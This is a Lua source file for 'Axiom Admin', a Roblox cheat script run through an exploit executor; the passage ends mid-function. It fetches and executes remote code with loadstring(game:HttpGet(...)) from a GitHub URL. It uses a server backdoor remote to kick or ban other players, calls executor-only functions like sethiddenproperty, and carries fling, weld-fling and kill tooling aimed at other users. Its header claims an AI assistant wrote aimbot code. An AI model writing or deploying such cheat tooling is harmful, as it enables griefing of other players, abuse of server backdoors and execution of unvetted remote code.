--[[
	Axiom Admin Public Build Open Source

	THIS BUILD HAS ONLY BEEN TESTED ON MY SYSTEM
	THIS BUILD IS A PC ONLY BUILD
	THIS BUILD IS NOT GUARANTEED TO WORK ON ALL SYSTEMS DUE TO THE GUI FORMAT

	Btw yes the gui is made by me, created all in roblox studio!

	a little note about me is im a small dev that gets things done too quickly
	i actually made this script in just 2 days with functional gui and commands
	hints why i update so quickly and make abunch of games and scripts.

	Credits
		- Zipi (Zinx) - Creator of Axiom Admin
		- Fork - Helped with some code and ideas
		- Claude - Helped with aimbot code, and the other client stuff (its obvious when you find the parts) and ideas
]]
local globalLib
local aaver = "INDEV"
if game.Players.LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("AxiomsAdminThing") then
	return 
else
	local Players = game:GetService("Players")
	local TweenService = game:GetService("TweenService")

	local player = Players.LocalPlayer
	local playerGui = player:WaitForChild("PlayerGui")

	local gui = Instance.new("ScreenGui")
	gui.Name = "LoadingGui"
	gui.IgnoreGuiInset = true
	gui.ResetOnSpawn = false
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = playerGui

	local background = Instance.new("Frame")
	background.Size = UDim2.fromScale(1,1)
	background.Transparency = 1
	background.BorderSizePixel = 0
	background.Parent = gui

	local panel = Instance.new("Frame")
	panel.AnchorPoint = Vector2.new(0.5,0.5)
	panel.Position = UDim2.fromScale(.5,.5)
	panel.Size = UDim2.fromOffset(520,170)
	panel.BackgroundColor3 = Color3.fromRGB(15,15,25)
	panel.Transparency = 1
	panel.BorderSizePixel = 0
	panel.Parent = background

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0,14)
	corner.Parent = panel

	local status = Instance.new("TextLabel")
	status.BackgroundTransparency = 1
	status.Size = UDim2.new(1,-40,0,30)
	status.Position = UDim2.new(0,20,0,78)
	status.TextXAlignment = Enum.TextXAlignment.Left
	status.Font = Enum.Font.GothamMedium
	status.Text = "Starting..."
	status.TextSize = 18
	status.TextColor3 = Color3.new(1,1,1)
	status.Parent = panel

	local barBG = Instance.new("Frame")
	barBG.AnchorPoint = Vector2.new(.5,0)
	barBG.Position = UDim2.new(.5,0,0,118)
	barBG.Size = UDim2.new(1,-40,0,16)
	barBG.BackgroundColor3 = Color3.fromRGB(45,45,55)
	barBG.BorderSizePixel = 0
	barBG.Parent = panel

	local bgCorner = Instance.new("UICorner")
	bgCorner.CornerRadius = UDim.new(1,0)
	bgCorner.Parent = barBG

	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(0,0,1,0)
	bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
	bar.BorderSizePixel = 0
	bar.Parent = barBG

	local barCorner = Instance.new("UICorner")
	barCorner.CornerRadius = UDim.new(1,0)
	barCorner.Parent = bar

	local gradient = Instance.new("UIGradient")
	gradient.Color = ColorSequence.new{
		ColorSequenceKeypoint.new(0,Color3.fromRGB(0,140,140)),
		ColorSequenceKeypoint.new(.5,Color3.fromRGB(0,220,255)),
		ColorSequenceKeypoint.new(1,Color3.fromRGB(0,140,255))
	}
	gradient.Parent = bar

	local function setProgress(progress, text)
		status.Text = text

		TweenService:Create(
			bar,
			TweenInfo.new(.35, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
			{Size = UDim2.new(progress,0,1,0)}
		):Play()
		gradient.Color = ColorSequence.new{
			ColorSequenceKeypoint.new(0,Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))),
			ColorSequenceKeypoint.new(.5,Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255))),
			ColorSequenceKeypoint.new(1,Color3.fromRGB(math.random(1,255),math.random(1,255),math.random(1,255)))
		}
	end
	local cloudversion
	setProgress(.05,"Initializing Client")
	game:GetService("RunService").PreRender:Wait()

	setProgress(.25,"Loading globallib")
	globalLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/NotAtomz/Atom-Scripts/refs/heads/main/globallib"))()
	task.wait(math.random(1,10)/10)

	setProgress(.50,"Fetching Version")
	cloudversion = tostring(game:HttpGet("https://pastebin.com/raw/uj8d35eA"))
	task.wait(math.random(1,10)/10)

	setProgress(.75,"Comparing Version")
	if cloudversion == aaver then
		print("Verified")
	else
		aaver = nil 
	end
	task.wait(math.random(1,10)/10)

	setProgress(1,"Completed ✓")
	task.wait(1)

	TweenService:Create(background,TweenInfo.new(.5),{
		BackgroundTransparency=1
	}):Play()

	TweenService:Create(panel,TweenInfo.new(.5),{
		BackgroundTransparency=1
	}):Play()

	for _,v in ipairs(panel:GetDescendants()) do
		if v:IsA("TextLabel") then
			TweenService:Create(v,TweenInfo.new(.5),{
				TextTransparency=1
			}):Play()
		elseif v:IsA("Frame") then
			TweenService:Create(v,TweenInfo.new(.5),{
				BackgroundTransparency=1
			}):Play()
		elseif v:IsA("UIStroke") then
			TweenService:Create(v,TweenInfo.new(.5),{
				Transparency=1
			}):Play()
		end
	end

	task.wait(.6)
	gui:Destroy()
end

if aaver == nil then
	return
end

local ScreenGui = Instance.new("ScreenGui")
local CMDLINE = Instance.new("Folder")
local Background = Instance.new("Frame")
local TopLine = Instance.new("Frame")
local Decor = Instance.new("TextLabel")
local Input = Instance.new("TextBox")
local Commands = Instance.new("ScrollingFrame")
local UIGridLayout = Instance.new("UIGridLayout")
local UICorner = Instance.new("UICorner")
local adminConnections = {
	keyconnectcheck = nil,
	textchatconnect = true,
	plrjoinconnect = nil
}

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Name = "AxiomsAdminThing"
ScreenGui.ResetOnSpawn = false

CMDLINE.Name = "CMDLINE"
CMDLINE.Parent = ScreenGui

Background.Name = "Background"
Background.Parent = CMDLINE
Background.AnchorPoint = Vector2.new(0.5, 0.899999976)
Background.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
Background.BorderColor3 = Color3.fromRGB(0, 0, 0)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0.5, 0, 0.899999976, 0)
Background.Size = UDim2.new(0.699999988, 0, 0, 40)

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = Background

TopLine.Name = "TopLine"
TopLine.Parent = Background
TopLine.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
TopLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
TopLine.Position = UDim2.new(0, 0, 1, 0)
TopLine.BorderSizePixel = 0
TopLine.Size = UDim2.new(1, 0, 0, 3)

local toplinecorner = UICorner:Clone()
toplinecorner.Parent = TopLine

Decor.Name = "Decor"
Decor.Parent = Background
Decor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Decor.BackgroundTransparency = 1.000
Decor.BorderColor3 = Color3.fromRGB(0, 0, 0)
Decor.BorderSizePixel = 0
Decor.Size = UDim2.new(0, 45, 1, 0)
Decor.Font = Enum.Font.Code
Decor.Text = ">"
Decor.TextColor3 = Color3.fromRGB(255, 255, 255)
Decor.TextSize = 17.000

Input.Name = "Input"
Input.Parent = Background
Input.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Input.BackgroundTransparency = 1.000
Input.BorderColor3 = Color3.fromRGB(0, 0, 0)
Input.BorderSizePixel = 0
Input.Position = UDim2.new(0.03, 0, 0, 0)
Input.Size = UDim2.new(1, 523, 1, 0)
Input.Font = Enum.Font.Code
Input.PlaceholderText = "Enter Command"
Input.Text = ""
Input.TextColor3 = Color3.fromRGB(255, 255, 255)
Input.TextSize = 18.000
Input.TextXAlignment = Enum.TextXAlignment.Left

Commands.Name = "Commands"
Commands.Parent = Background
Commands.Active = true
Commands.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Commands.BackgroundTransparency = 1.000
Commands.BorderColor3 = Color3.fromRGB(0, 0, 0)
Commands.BorderSizePixel = 0
Commands.Position = UDim2.new(-0.000348988309, 0, -14, 0)
Commands.Size = UDim2.new(1, 0, 0, 550)

UIGridLayout.CellSize = UDim2.new(1, 0, 0, 40)
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 3)
UIGridLayout.SortOrder = Enum.SortOrder.Name
UIGridLayout.Parent = Commands

local RunServicess = game:GetService("RunService")
local hue = 0
local rainbowconnection

rainbowconnection = RunServicess.RenderStepped:Connect(function(dt)
	if Background == nil or TopLine == nil then 
		rainbowconnection:Disconnect()
		rainbowconnection = nil
		return 
	end
	if Background.Visible then
		hue = (hue + dt * 0.25) % 1 

		TopLine.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
	end
end)

local function LUFLUDB_fake_script() 
	local script = Instance.new('LocalScript', ScreenGui)
	function firesound(soundid)
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://"..soundid..""
		sound.Parent = game:GetService("SoundService")
		sound:Play()
		sound.Ended:Connect(function()
			sound:Destroy()
		end)
	end
	local CoreGui = game:GetService("CoreGui")
	local TextService = game:GetService("TextService")
	local TweenService = game:GetService("TweenService")
	local RunService = game:GetService("RunService")

	local MAX_VISIBLE = 10  
	local DEFAULT_DURATION = 15
	local NOTIF_WIDTH = 260
	local PADDING_LEFT = 16
	local PADDING_X = 8
	local TOP_PADDING = 8
	local TITLE_HEIGHT = 18
	local BOTTOM_PADDING = 10
	local MIN_HEIGHT = 50
	local GAP = 8

	local ScreenGui = Instance.new("ScreenGui")
	ScreenGui.Name = "CustomNoticeGui"
	ScreenGui.ResetOnSpawn = false
	ScreenGui.IgnoreGuiInset = true
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.DisplayOrder = 10000

	local parented = pcall(function()
		ScreenGui.Parent = CoreGui
	end)
	if not parented then
		ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
	end

	local Container = Instance.new("Frame")
	Container.Name = "NoticeContainer"
	Container.BackgroundTransparency = 1
	Container.AnchorPoint = Vector2.new(1, 1)
	Container.Position = UDim2.new(1, -16, 1, -16)
	Container.Size = UDim2.new(0, NOTIF_WIDTH, 1, -32)
	Container.Parent = ScreenGui

	local Layout = Instance.new("UIListLayout")
	Layout.SortOrder = Enum.SortOrder.LayoutOrder
	Layout.VerticalAlignment = Enum.VerticalAlignment.Bottom
	Layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
	Layout.Padding = UDim.new(0, GAP)
	Layout.Parent = Container

	local ActiveNotices = {}
	local OrderCounter = 0

	local function removeNotice(frame)
		for i, f in ipairs(ActiveNotices) do
			if f == frame then
				table.remove(ActiveNotices, i)
				break
			end
		end

		local tween = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
			BackgroundTransparency = 1,
			Position = frame.Position + UDim2.new(0, 40, 0, 0),
		})
		tween:Play()
		tween.Completed:Connect(function()
			frame:Destroy()
		end)
	end

	local function createNotice(msg, duration)
		OrderCounter += 1
		while #ActiveNotices >= MAX_VISIBLE do
			removeNotice(ActiveNotices[1])
		end

		local frame = Instance.new("Frame")
		frame.Name = "Notice"
		frame.LayoutOrder = OrderCounter
		frame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.ClipsDescendants = true
		frame.Parent = Container

		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = UDim.new(0, 6)
		uiCorner.Parent = frame

		local uiStroke = Instance.new("UIStroke")
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke.Color = Color3.fromRGB(40, 40, 45)
		uiStroke.LineJoinMode = Enum.LineJoinMode.Round
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.2
		uiStroke.Parent = frame

		local accentBar = Instance.new("Frame")
		accentBar.Name = "AccentBar"
		accentBar.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
		accentBar.BorderSizePixel = 0
		accentBar.Position = UDim2.new(0, 0, 0, 0)
		accentBar.Size = UDim2.new(0, 4, 1, 0)
		accentBar.Parent = frame

		local accentCorner = Instance.new("UICorner")
		accentCorner.CornerRadius = UDim.new(0, 6)
		accentCorner.Parent = accentBar

		local accentMask = Instance.new("Frame")
		accentMask.BackgroundColor3 = accentBar.BackgroundColor3
		accentMask.BorderSizePixel = 0
		accentMask.AnchorPoint = Vector2.new(1, 0)
		accentMask.Position = UDim2.new(1, 0, 0, 0)
		accentMask.Size = UDim2.new(0, 3, 1, 0)
		accentMask.Parent = accentBar

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Name = "NoticeTitle"
		titleLabel.BackgroundTransparency = 1
		titleLabel.Font = Enum.Font.Code
		titleLabel.TextSize = 14
		titleLabel.TextColor3 = Color3.fromRGB(0, 200, 0)
		titleLabel.Text = "Notice"
		titleLabel.TextXAlignment = Enum.TextXAlignment.Left
		titleLabel.TextYAlignment = Enum.TextYAlignment.Top
		titleLabel.AnchorPoint = Vector2.new(0, 0)
		titleLabel.Position = UDim2.new(0, PADDING_LEFT, 0, TOP_PADDING)
		titleLabel.Size = UDim2.new(1, -(PADDING_LEFT + PADDING_X), 0, TITLE_HEIGHT)
		titleLabel.Parent = frame

		local availableWidth = NOTIF_WIDTH - (PADDING_LEFT + PADDING_X)
		local textBounds = TextService:GetTextSize(msg, 14, Enum.Font.Code, Vector2.new(availableWidth, math.huge))
		local textHeight = textBounds.Y

		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "NoticeText"
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.Code
		textLabel.TextSize = 14
		textLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
		textLabel.TextWrapped = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.TextYAlignment = Enum.TextYAlignment.Top
		textLabel.Text = msg
		textLabel.AnchorPoint = Vector2.new(0, 0)
		textLabel.Position = UDim2.new(0, PADDING_LEFT, 0, TOP_PADDING + TITLE_HEIGHT + 2)
		textLabel.Size = UDim2.new(1, -(PADDING_LEFT + PADDING_X), 0, textHeight)
		textLabel.Parent = frame

		local newHeight = math.max(TOP_PADDING + TITLE_HEIGHT + 2 + textHeight + BOTTOM_PADDING, MIN_HEIGHT)

		local hue = 0
		local conn
		conn = RunService.RenderStepped:Connect(function(dt)
			if not accentBar.Parent then
				conn:Disconnect()
				return
			end
			hue = (hue + dt * 0.25) % 1
			local color = Color3.fromHSV(hue, 1, 1)
			accentBar.BackgroundColor3 = color
			accentMask.BackgroundColor3 = color
			titleLabel.TextColor3 = color
		end)
		frame.Size = UDim2.new(1, 0, 0, 0)
		frame.Position = UDim2.new(0, 40, 0, 0)
		TweenService:Create(frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			BackgroundTransparency = 0,
			Size = UDim2.new(1, 0, 0, newHeight),
			Position = UDim2.new(0, 0, 0, 0),
		}):Play()

		table.insert(ActiveNotices, frame)

		task.delay(duration or DEFAULT_DURATION, function()
			if frame.Parent then
				removeNotice(frame)
			end
		end)
	end

	function notice(msg)
		pcall(function()
			firesound(17208372272)
		end)
		createNotice(msg, 15)
	end
	print([[ 
------------------------------------------------------------------
		Axiom Admin Executable Line
			Made with:
				Console Line Admin
				Console Line Admin Dark
				Atom Admin v1-v6
				Atomic Admin v1-v2
				And some guy named fork
			
			Made By Zipi AKA Zinx
			Version 1
			Chat Prefix !
			Command Line Prefix ;
		
		Nameless admin skidded all this btw.
		Homebrew admin V2 took my force idea ;(
------------------------------------------------------------------
	]])
	local players = game:GetService("Players")
	local UserInputService = game:GetService("UserInputService")
	local plr = players.LocalPlayer
	local tws = game:GetService('TweenService')
	local tweeninfo = TweenInfo.new(1,Enum.EasingStyle.Linear)
	local savedFallenPDH = workspace.FallenPartsDestroyHeight
	local LoopKills = {}
	local clickkillmove = nil
	local Lagging = false
	local killonclick = nil
	local killaurapart = nil
	local networkownershipall = false
	local kafollowplr = nil
	local mcontroltest = false
	local partinka = {}
	local HeadSitState = {
		Part = nil,
		AnchorWeld = nil,
		Connection = nil,
		JumpConnection = nil
	}
	local HeadSitState2 = {
		Active = false,
		Connection = nil,
		JumpConnection = nil,
	}
	local SoundLoop = {
		Sounds = {},
		Running = false,
		Connections = {}
	}
	local StareState = {
		Target = nil,
		Connection = nil
	}
	local CarpetState = {
		Active = false,
		Target = nil,
		Character = nil,
		RootPart = nil,
		Humanoid = nil,
		BodyGyro = nil,
		BodyVelocity = nil,
		Keys = {W = false, A = false, S = false, D = false},
		MoveConnection = nil,
		SyncConnection = nil,
		InputBeganConn = nil,
		InputEndedConn = nil,
		TargetHadCollision = nil,
	}
	local SpinLoop = { Connection = nil }
	local FollowLoop = { Connection = nil, Active = false }
	local tempdisableantifling = false
	local nc = false
	local bang2 = false
	local ncLoop
	local lastobjplace
	local lastobjcollisionvalue
	local lastobjcveloc
	local slock = false
	local TempAdminUserIds = {
		
	}
	local BannedUserIds = {
		
	}
	function AdminUser(userId)
		if userId == plr.UserId then return end
		TempAdminUserIds[userId] = true
	end
	function UnAdminUser(userId)
		if userId == plr.UserId then return end
		TempAdminUserIds[userId] = nil
	end
	function BanUser(userId)
		if userId == plr.UserId then return end
		BannedUserIds[userId] = true
	end
	function UnbanUser(userId)
		if userId == plr.UserId then return end
		BannedUserIds[userId] = nil
	end
	adminConnections.plrjoinconnect = players.PlayerAdded:Connect(function(player)
		if slock == true then
			local targetname = player.Name
			runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then v:Kick('This experience is locked.') end end")
		end
		if BannedUserIds[player.UserId] then
			local targetname = player.Name
			runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then v:Kick('You are banned from this experience.') end end")
		end
	end)
	function privatechat(user, message)
		task.spawn(function()
			local TextChatService = game:GetService("TextChatService")
			local channels = TextChatService:WaitForChild("TextChannels")

			print("START")

			task.spawn(function()
				pcall(function()
					TextChatService.TextChannels.RBXGeneral:SendAsync("/w "..user.DisplayName)
				end)
			end)

			print("reached here") 

			local whisperChannel

			for _ = 1, 20 do
				for _, channel in ipairs(channels:GetChildren()) do
					local a, b = channel.Name:match("^RBXWhisper:(%d+)_(%d+)$")

					if a then
						a, b = tonumber(a), tonumber(b)

						if a == user.UserId and b == game.Players.LocalPlayer.UserId then
							whisperChannel = channel
							break
						end
					end
				end

				if whisperChannel then break end
				task.wait(0.1)
			end

			if whisperChannel then
				pcall(function()
					whisperChannel:SendAsync(message)
				end)
			else
				warn("Whisper failed, fallback used")
				
			end
		end)
	end
	
	function glue(target, shouldglue)
		local root = getChar() and getChar():FindFirstChild("HumanoidRootPart")
		if not root or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
			return
		end
		if shouldglue then
			sethiddenproperty(root, "PhysicsRepRootPart", target.Character.HumanoidRootPart)
		else
			sethiddenproperty(root, "PhysicsRepRootPart", root)
		end
	end
	function chechifalive(chara)
		if chara == nil then return false end
		if not chara:IsDescendantOf(workspace) then return false end

		local humanoid = chara:FindFirstChildOfClass("Humanoid")
		if not humanoid then return false end
		if humanoid.Health <= 0 then return false end
		if humanoid:GetState() == Enum.HumanoidStateType.Dead then return false end

		local root = chara:FindFirstChild("HumanoidRootPart")
		if not root then return false end
		if not root:IsDescendantOf(workspace) then return false end

		local R6Parts = {"Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg"}
		local R15Parts = {"Head", "UpperTorso", "LowerTorso", "LeftUpperArm", "RightUpperArm",
						"LeftLowerArm", "RightLowerArm", "LeftHand", "RightHand",
						"LeftUpperLeg", "RightUpperLeg", "LeftLowerLeg", "RightLowerLeg",
						"LeftFoot", "RightFoot"}

		local isR15 = chara:FindFirstChild("UpperTorso") ~= nil
		local requiredParts = isR15 and R15Parts or R6Parts

		for _, partName in ipairs(requiredParts) do
			local part = chara:FindFirstChild(partName)
			if not part then return false end
			if not part:IsDescendantOf(workspace) then return false end
		end

		if not chara:FindFirstChild("Animate") then return false end

		local animator = humanoid:FindFirstChildOfClass("Animator")
		if not animator then return false end

		if root.Anchored then return false end

		if root.Position.Y < -1000 then return false end

		return true
	end
	function setHumState(hum, state, isenabled)
		hum:SetStateEnabled(state, isenabled)
	end
	function enabletoolanim()
		local PlayEmote = Instance.new("BindableFunction")
		PlayEmote.Name = "PlayEmote"
		PlayEmote.Parent = plr.Character.Animate
		plr.Character.Animate.Disabled = true
		plr.Character.Animate.Disabled = false
	end
	function disableatoolnim()
		if not plr.Character.Animate:FindFirstChild("PlayEmote") then enabletoolanim() wait()end
		plr.Character.Animate.PlayEmote:Destroy()
		plr.Character.Animate.Disabled = true
		plr.Character.Animate.Disabled = false
	end
	local isRCDEnabled = false
	function CheckRCD()
		local player = game.Players.LocalPlayer
		local character = player.Character
		if not character then return false end

		local humanoid = character:FindFirstChildOfClass("Humanoid")
		if not humanoid then return false end

		local respawnTime = game.Players.RespawnTime
		local waitTime = math.max(respawnTime + 1, 3)

		local respawned = false

		local conn
		conn = player.CharacterAdded:Connect(function()
			respawned = true
			conn:Disconnect()
		end)

		humanoid:Destroy()

		local elapsed = 0
		while elapsed < waitTime and not respawned do
			task.wait(0.1)
			elapsed += 0.1
		end

		conn:Disconnect()

		if respawned then
			return false
		else
			local hrp = character:FindFirstChild("HumanoidRootPart")
			if hrp then
				for _, obj in ipairs(hrp:GetChildren()) do
					if obj:IsA("BodyMover") or obj:IsA("BodyVelocity")
					or obj:IsA("BodyGyro") or obj:IsA("BodyPosition")
					or obj:IsA("BodyForce") or obj:IsA("AlignPosition")
					or obj:IsA("AlignOrientation") then
						obj:Destroy()
					end
				end

				for _, part in ipairs(character:GetDescendants()) do
					if part:IsA("BasePart") then
						part.Anchored = false
					end
				end

				local targetY = workspace.FallenPartsDestroyHeight - 500
				local RunService = game:GetService("RunService")
				local voidConn
				local voidRespawnConn

				voidRespawnConn = player.CharacterAdded:Connect(function()
					if voidConn then voidConn:Disconnect() end
					voidRespawnConn:Disconnect()
				end)

				voidConn = RunService.Heartbeat:Connect(function()
					if not hrp or not hrp.Parent then
						voidConn:Disconnect()
						if voidRespawnConn then voidRespawnConn:Disconnect() end
						return
					end

					hrp.CFrame = CFrame.new(
						hrp.Position.X,
						hrp.Position.Y - 50,
						hrp.Position.Z
					)

					hrp.AssemblyLinearVelocity = Vector3.new(0, -500, 0)

					if hrp.Position.Y <= targetY then
						voidConn:Disconnect()
					end
				end)
			end

			return true
		end
	end
	function destroyGrip(yourchar)
		for _, weld in pairs(getChar():GetDescendants()) do
			if weld.Name == "RightGrip" then
				weld:Destroy()
			end
		end
	end

	ncLoop = game:GetService("RunService").Stepped:Connect(function()
		if nc and game.Players.LocalPlayer.Character ~= nil then
			for _, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if v:IsA("BasePart") and v.CanCollide == true then
					v.CanCollide = false
				end
			end
		end
	end)
	function tpbypass(v)
		if plr.Character and plr.Character:FindFirstChild('HumanoidRootPart') then
			local cf = v.Character.Humanoid.RootPart.CFrame
			local a = tws:Create(plr.Character.HumanoidRootPart,tweeninfo,{CFrame=cf})
			local root = getChar():WaitForChild("HumanoidRootPart")
			root.AssemblyLinearVelocity = Vector3.zero
			root.AssemblyAngularVelocity = Vector3.zero
			a:Play()
		end
	end
	function stopsoundinobj(obje)
		for _, v in pairs(obje:GetDescendants()) do
			if v:IsA("Sound") then
				v:Stop()
				v.Playing = false
			end
		end
	end

	function getChar()
		return plr.Character
	end
	function getBp()
		return plr.Backpack
	end
	function getPlr(str)
		local targetss = {}
		local foundtarget = false
		str = str:lower()

		for _, v in pairs(players:GetPlayers()) do
			if v.Name:lower():match(str) or v.DisplayName:lower():match(str) then
				foundtarget = true
				return {v} 
			end
		end

		if str == "me" or str == "self" then
			foundtarget = true
			return {plr} 
		end
		if str == "all" or str == "everyone" then
			foundtarget = true
			return players:GetPlayers() 
		end
		if str == "others" then
			for _, v in pairs(players:GetPlayers()) do
				if v ~= plr then
					foundtarget = true
					table.insert(targetss, v)
				end
			end
			return targetss
		end
		if str == "random" then
			local allPlayers = players:GetPlayers()
			if #allPlayers > 0 then
				foundtarget = true
				return {allPlayers[math.random(1, #allPlayers)]} 
			end
		end
		if foundtarget == false then
			notice("Failed to find target: "..str)
		end
		return {} 
	end
	function respawn()
		getChar().Humanoid.Health = 0
	end
	
	function refresh()
		local cf, p = CFrame.new(), getChar():FindFirstChild("HumanoidRootPart") or getChar():FindFirstChild("Head")
		if p then
			cf = p.CFrame
		end
		respawn()
		plr.CharacterAdded:Wait(); 
		getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
		getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
		getChar():WaitForChild("HumanoidRootPart").CFrame = cf
	end
	function fling(target, power, timef)
		if chechifalive(target.Character) == false then notice("Axiom prevent a command from running due to: Target Is Dead") return end
		if target.Character.Humanoid.Sit then notice("Axiom prevent a command from running due to: Your Player Is Sitting") return end
		tempdisableantifling = true
		local flingTime = timef
		local fTime = os.clock()
		local cr = getChar()
		local old = cr:FindFirstChild("HumanoidRootPart").CFrame
		local rot = power
		local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool")
		local originalGrip = nil
		if tool then
			originalGrip = tool.Grip
		end
		local hum = getChar():FindFirstChildOfClass("Humanoid")
		local root = hum.RootPart
		local tRoot = target.Character:FindFirstChild("Torso") or target.Character:FindFirstChild("UpperTorso")
		local origCF = root.CFrame
		local origState = hum:GetState()
		local origFpdh = workspace.FallenPartsDestroyHeight
		local colplren = false
		if target.Character.Head.CanCollide then colplren = true end
		if colplren then
			for i,gh in ipairs(target.Character:GetDescendants()) do
				if gh:IsA("BasePart") then
					gh.CanCollide = false
				end
			end
		end
		workspace.FallenPartsDestroyHeight = 0 / 0
		hum:ChangeState(Enum.HumanoidStateType.Physics)
		hum:UnequipTools()
		
			if tool then
				tool.Handle.Massless = true
				tool.Grip = CFrame.new(5773, 5774, 5773)
				tool.Parent = getChar()
			end
		
		local bv = Instance.new("BodyVelocity")
		local bav = Instance.new("BodyAngularVelocity")
			bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bv.Velocity = Vector3.new(9e30, 9e30, 9e30)
			bv.Parent = root
			bav.AngularVelocity = Vector3.new(9e30, 9e30, 9e30)
			bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bav.Parent = root
		
			while true do
				if os.clock() - fTime >= flingTime then
					break
				else
					rot = power
					root.CFrame = tRoot.CFrame * CFrame.Angles(math.rad(rot), 0, 0) + target.Character:FindFirstChildOfClass("Humanoid").MoveDirection * target.Character:FindFirstChildOfClass("Humanoid").WalkSpeed * .4
				end
				game:GetService("RunService").PreRender:Wait()
			end
		
		hum:ChangeState(origState)
		bav:Destroy()
		bv:Destroy()
		root.Velocity = Vector3.new()
		root.RotVelocity = Vector3.new()
		root.CFrame = origCF
		workspace.FallenPartsDestroyHeight = origFpdh
		if tool then
			tool.Grip = originalGrip
		end
		hum:UnequipTools()
		tempdisableantifling = false
		if not getChar():FindFirstChild("HumanoidRootPart") then
			notice("Failed to fling "..target.Name..".")
			return 
		end
		getChar():FindFirstChild("HumanoidRootPart").CFrame = old
		if colplren then
			for i,gh in ipairs(target.Character:GetDescendants()) do
				if gh:IsA("BasePart") then
					gh.CanCollide = true
				end
			end
		end
		notice("Flinged "..target.Name..".")
	end
	function WeldFling(targets, weldpositionoffset, weldrotationoffset, velocity, allowautoeject)
		if #targets == 0 then return end
		local target = targets[1]
		if chechifalive(target.Character) == false then notice("Axiom prevent a command from running due to: Target Is Dead") return end
		local targetChar = target.Character
		if not targetChar then return end
		local targetHead = targetChar:FindFirstChild("Head")
		if not targetHead then return end
		tempdisableantifling = true
		local character = getChar()
		local old = getChar():WaitForChild("HumanoidRootPart").CFrame
		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		local hrp = character:FindFirstChild("HumanoidRootPart")
		if not humanoid or not torso or not hrp then return end

		nc = true
		local function StopWeldFling()
			if HeadSitState.Connection then HeadSitState.Connection:Disconnect() end
			if HeadSitState.JumpConnection then HeadSitState.JumpConnection:Disconnect() end
			if HeadSitState.AnchorWeld then HeadSitState.AnchorWeld:Destroy() end
			if HeadSitState.Part then HeadSitState.Part:Destroy() end

			HeadSitState.Part = nil
			HeadSitState.AnchorWeld = nil
			HeadSitState.Connection = nil
			HeadSitState.JumpConnection = nil

			humanoid.Sit = false
			tempdisableantifling = false
			nc = false

			local root = getChar():WaitForChild("HumanoidRootPart")
			root.AssemblyLinearVelocity = Vector3.zero
			root.AssemblyAngularVelocity = Vector3.zero
			getChar():WaitForChild("HumanoidRootPart").CFrame = old
		end
		if HeadSitState.Part then
			StopWeldFling()
			return
		end

		local RunService = game:GetService("RunService")

		local anchor = Instance.new("Part")
		anchor.Name = "HeadSitAnchor"
		anchor.Size = Vector3.new(0.2, 0.2, 0.2)
		anchor.Transparency = 1
		anchor.CanCollide = false
		anchor.CanQuery = false
		anchor.Anchored = false
		anchor.Massless = true
		anchor.CFrame = targetHead.CFrame * weldpositionoffset * weldrotationoffset
		anchor.Parent = workspace

		HeadSitState.Part = anchor

		humanoid.Sit = true

		local anchorWeld = Instance.new("WeldConstraint")
		anchorWeld.Name = "HeadSitAnchorWeld"
		anchorWeld.Part0 = anchor
		anchorWeld.Part1 = targetHead
		anchorWeld.Parent = anchor

		HeadSitState.AnchorWeld = anchorWeld

		local torsoOffsetFromHRP = hrp.CFrame:ToObjectSpace(torso.CFrame)
		HeadSitState.Connection = RunService.Heartbeat:Connect(function()
			if humanoid.Sit == false then
				StopWeldFling()
				local root = getChar():WaitForChild("HumanoidRootPart")

